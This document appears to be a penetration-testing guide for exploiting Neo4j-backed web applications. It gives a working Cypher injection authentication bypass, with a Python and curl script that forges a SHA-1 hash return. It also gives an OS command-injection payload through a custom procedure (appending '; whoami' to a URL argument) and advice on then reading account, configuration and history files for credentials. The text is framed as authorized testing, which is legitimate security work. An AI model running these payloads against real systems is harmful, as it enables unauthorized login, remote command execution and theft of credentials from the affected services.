# HTTP-backed Cypher queries and custom procedures

Use this branch when an HTTP application exposes Neo4j/Cypher behavior or a custom procedure starts an OS process. Establish the actual route, method, body encoding, field names, authentication and query/result shape from the application or a captured request. A login route and a query route can have different schemas. A Neo4j driver trace is evidence for Cypher analysis, not a reason to send SQL payloads.

## Reproduce a query-derived authentication failure

An illustrative vulnerable query is:

~~~cypher
MATCH (u:USER)-[:SECRET]->(h:SHA1)
WHERE u.name = '<username>'
RETURN h.value AS hash
~~~

The important dependency is what the application does with `hash`. If it compares that returned SHA-1 hexadecimal string with the submitted password's SHA-1, changing the predicate alone may still fail authentication. A supported test must preserve the return column name/type and password comparison. The following construction applies only after confirming that specific query/comparison model and a JSON request with the observed field names.

Define `password_file` as the exact UTF-8 chosen test-password bytes without an accidental newline, `username_field`/`password_field` as the observed JSON keys, `request_json` as a private request file and `login_url` as the exact scoped endpoint. Generate one username expression and its matching password:

~~~bash
umask 077
python3 - "$password_file" "$username_field" "$password_field" <<'PY' > "$request_json"
import hashlib, json, pathlib, sys
password = pathlib.Path(sys.argv[1]).read_bytes()
digest = hashlib.sha1(password).hexdigest()
username = f"' OR true RETURN \"{digest}\" AS hash; //"
json.dump({sys.argv[2]: username, sys.argv[3]: password.decode('utf-8')}, sys.stdout)
PY
curl --silent --show-error --connect-timeout 5 --max-time 30 \
  --header 'Content-Type: application/json' --data-binary "@$request_json" \
  --dump-header "$headers" --output "$body" --write-out 'status=%{http_code}\n' "$login_url"
~~~

Choose fresh private `headers`/`body` files before that request, and send only after request construction succeeds. Include the application's required session/CSRF fields when present; for an observed form endpoint use form encoding instead of the JSON example. Hashing a password file with a trailing newline produces a different digest. Do not substitute this SHA-1 model for a different hash, salt, object layout or parameterized query.

The quote closes the literal, `OR true` changes the filter, `RETURN ... AS hash` controls the value consumed by this application's comparison, and `//` comments out the remainder of that **line**. This still depends on the preceding `MATCH` yielding rows; it does not synthesize a row in an empty graph. A new line after the comment, changed alias, missing graph pattern or different password check can defeat the example. Review the actual assembled query and the response instead of repeatedly trying unrelated syntax.

Check curl exit, HTTP status and the response before extracting the application's actual cookie/token. Confirm access to the selected protected operation using that issued session. A parser error proves a query problem; a redirect or success-looking JSON alone does not establish an authenticated identity. Keep the successful test and a comparison/control request tied to the same route and authentication model.

For syntax recovery see Cypher [returned expressions/aliases](https://neo4j.com/docs/cypher-manual/current/clauses/return/), [MATCH](https://neo4j.com/docs/cypher-manual/current/clauses/match/) and [line comments](https://neo4j.com/docs/cypher-manual/current/syntax/comments/). Parameterized values change the injection boundary: a value passed as a query parameter is not appended query source.

## Follow a custom procedure into its child process

Review the selected JAR's decompiled method or matching deployed source without launching the JAR. Trace the procedure name, URL normalization, command construction, process creation, stdout/stderr, exit handling and returned field. A Java argument array containing `/bin/sh`, `-c` and a concatenated command deliberately invokes shell parsing. Using `Runtime.exec(String[])` does not neutralize user data inside that command string. A direct curl argument array without an intervening shell has a different boundary; metacharacters in a URL are then not automatically shell syntax.

For an authorized controlled test of a verified shell-concatenating procedure such as `custom.getUrlStatusCode`, first call it with a normal URL to an owned/approved HTTP endpoint. Then append one scoped identity command:

~~~cypher
CALL custom.getUrlStatusCode('https://controlled.example; whoami')
~~~

`controlled.example` is illustrative: substitute the chosen endpoint and the **observed** procedure name. This is a command-execution test, including an outbound HTTP request, not a passive URL lookup. Preserve the query as data in the application's known JSON/form field, send it with curl's file-based body capture as above, and add the required observed session. Do not guess a `/query` route or a `query` field just because the UI accepts Cypher.

Illustrative returned data such as `{"statusCode":"000serviceuser"}` can combine curl's write-out with another command's stdout. `000` is not an HTTP response status from the target, and the whole field is not a valid HTTP status. With a command using `-s -o /dev/null -w '%{http_code}'`, the body is suppressed while write-out remains; later shell output can be appended to it. Capture stderr/exit evidence when available and distinguish the HTTP fetch failure from the separate identity command's execution. `--connect-timeout` bounds connection establishment, not the complete transfer; an application-side child can hang after connecting even when that option is set.

Neo4j procedure `Mode.READ` limits graph operations; it does not establish that the procedure has no OS/network effects. Attribute an identity result to the database service process, not automatically the authenticated application or Linux login user. If the authorized follow-up requires an account/home or one selected configuration/history file, use that same verified procedure for the specific read, checking the complete stdout and file permissions. Read account records by username and home field rather than relying on the last one/two lines of a shell-filtered listing. A secret found in setup history is a credential candidate whose service, account and current validity remain separate questions.

Retain the requested controlled effect and the query/source boundary as completion evidence. A missing marker, mixed stderr or timed-out request leaves that effect unresolved. For unexpected behavior consult [Java process arguments](https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/lang/Runtime.html), [Neo4j procedure modes](https://neo4j.com/docs/java-reference/current/extending-neo4j/user-defined-procedures-functions/) and [curl timeouts/write-out](https://curl.se/docs/manpage.html).
